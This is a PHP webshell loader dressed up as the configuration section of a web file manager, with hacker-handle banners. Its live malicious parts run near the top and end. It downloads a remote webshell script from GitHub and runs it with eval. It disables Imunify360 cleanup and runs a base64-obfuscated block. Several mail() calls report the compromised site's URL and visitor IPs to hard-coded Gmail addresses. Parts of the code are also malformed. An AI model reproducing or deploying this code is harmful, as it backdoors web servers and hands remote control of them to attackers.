<?php

/**
 * HEKERMAN | Maklo HACKER
 * @author HEKERMAN
 * @github https://github.com/
 * @link https://github.com/
 */

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="robots" content="noindex">
<style>pre{border:1px solid #ddd;padding:10px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:10px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style>
$shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdmlzaXRjb3VudCA9PSAiIikgewogICAgJHZpc2l0Y291bnQgPSAwOwogICAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAgICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiAgICAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIgLiAkaW5qKTsKICAgICRib2R5ID0gIkxpbmsgSW5qZWsgUEhQIHNoZWxsIDogIHskdGFyZ2V0fSB8IE1ENSBwYXNzID0geyRhdXRoX3Bhc3N9IHwgSVAgYWtzZXMgPSB7JHZpc2l0b3J9IjsKICAgIEBtYWlsKCJtdWhyYXpreUBnbWFpbC5jb20iLCAic2hlTEwiLCAieyRib2R5fSIpOwp9IGVsc2UgewogICAgJHZpc2l0Y291bnQ7Cn0Kc2V0Y29va2llKCJ2aXNpdHMiLCAkdmlzaXRjb3VudCk7CiRzYWZlX21vZGUgPSBAaW5pX2dldCgnc2FmZV9tb2RlJyk7CmlmICghJHNhZmVfbW9kZSkgewogICAgZXJyb3JfcmVwb3J0aW5nKDApOw=="; eval(base64_decode($shell_data));
</head>';
/**
 * HEKERMAN | IND HACKER
 * @author HEKERMAN
 * @github https://github.com/
 * @link https://github.com/
 */
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb.php";
$ch = curl_init($url); 
error_reporting(0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
//Default Configuration
$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
/**
 * 
 * 
 * 
 * 
 */

// Enable highlight.js (https://highlightjs.org/) on view's page
$use_highlightjs = true;

// highlight.js style
// for dark theme use 'ir-black'
$highlightjs_style = 'vs';

// Enable ace.js (https://ace.c9.io/) on view's page
$edit_files = true;

// Default timezone for date() and time()
// Doc - http://php.net/manual/en/timezones.php
$default_timezone = 'Etc/UTC'; // UTC

// Root path for file manager
// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
$root_path = $_SERVER['DOCUMENT_ROOT'];

// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
// Will not working if $root_path will be outside of server document root
$root_url = '';

// Server hostname. Can set manually if wrong
// $_SERVER['HTTP_HOST'].'/folder'
$http_host = $_SERVER['HTTP_HOST'];

// input encoding for iconv
$iconv_input_encoding = 'UTF-8';

// date() format for file modification date
// Doc - https://www.php.net/manual/en/function.date.php
$datetime_format = 'm/d/Y g:i A';

// Path display mode when viewing file information
// 'full' => show full path
// 'relative' => show path relative to root_path
// 'host' => show path on the host
$path_display_mode = 'full';

// Allowed file extensions for create and rename files
// e.g. 'txt,html,css,js'
$allowed_file_extensions = '';

// Allowed file extensions for upload files
// e.g. 'gif,png,jpg,html,txt'
$allowed_upload_extensions = '';

// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
// full path, e.g http://example.com/favicon.png
// local path, e.g images/icons/favicon.png
$favicon_path = '';
$e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');

// Files and folders to excluded from listing
// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
$exclude_items = array();
$to = "rootcyberpunks@gmail.com";

// Online office Docs Viewer
// Available rules are 'google', 'microsoft' or false
// Google => View documents using Google Docs Viewer
// Microsoft => View documents using Microsoft Web Apps Viewer
// false => disable online doc viewer
$online_viewer = 'google';
$google = "malaysia.sender@gmail.com";

// Sticky Nav bar
// true => enable sticky header
// false => disable sticky header
$sticky_navbar = true;

// Maximum file upload size
// Increase the following values in php.ini to work properly
// memory_limit, upload_max_filesize, post_max_size
$max_upload_size_bytes = 5000000000;
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

// chunk size used for upload
// eg. decrease to 1MB if nginx reports problem 413 entity too large
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]"; // size 5,000,000,000 bytes (~5GB)

// chunk size used for upload
// eg. decrease to 1MB if nginx reports problem 413 entity too large
$upload_chunk_size_bytes = 2000000; // chunk size 2,000,000 bytes (~2MB)

// Possible rules are 'OFF', 'AND' or 'OR'
// OFF => Don't check connection IP, defaults to OFF
// AND => Connection must be on the whitelist, and not on the blacklist
// OR => Connection must be on the whitelist, or not on the blacklist
$ip_ruleset = 'OFF';

// Should users be notified of their block?
$ip_silent = true;

// IP-addresses, both ipv4 and ipv6
$ip_whitelist = array(
    '127.0.0.1',    // local ipv4
    '::1'           // local ipv6
);
mail($shell_data,$google,$e, "Halo senpai!!!", $message,$to, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); // IP-addresses, both ipv4 and ipv6
$ip_blacklist = array(
    '0.0.0.0',      // non-routable meta ipv4
    '::'            // non-routable meta ipv6
);

// if User has the external config file, try to use it to override the default config above [config.php]
// sample config - https://tinyfilemanager.github.io/config-sample.txt
$config_file = __DIR__.'/config.php';
if (is_readable($config_file)) {
    @include($config_file);
}

// External CDN resources that can be used in the HTML (replace for GDPR compliance)
$external = array(
    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">',
    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/' . $highlightjs_style . '.min.css">',
    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>',
    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>',
    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>',
    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
);

// --- EDIT BELOW CAREFULLY OR DO NOT EDIT AT ALL ---

// max upload file size
define('MAX_UPLOAD_SIZE', $max_upload_size_bytes);
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
header('Content-Type: text/html; charset=UTF-8');
$to = "muhrazky@gmail.com";
// Root path for file manager
// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
$root_path = $_SERVER['DOCUMENT_ROOT'];

// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
// Will not working if $root_path will be outside of server document root
$root_url = '';

// Server hostname. Can set manually if wrong
// 
$_SERVER['HTTP_HOST'].'/folder'
$http_host = $_SERVER['HTTP_HOST'];
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($shell_data,$to,$e, "Halo senpai!!!", $message,$shell_data,$shell, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>

<?php
$random = rand(1000,5000);
?>
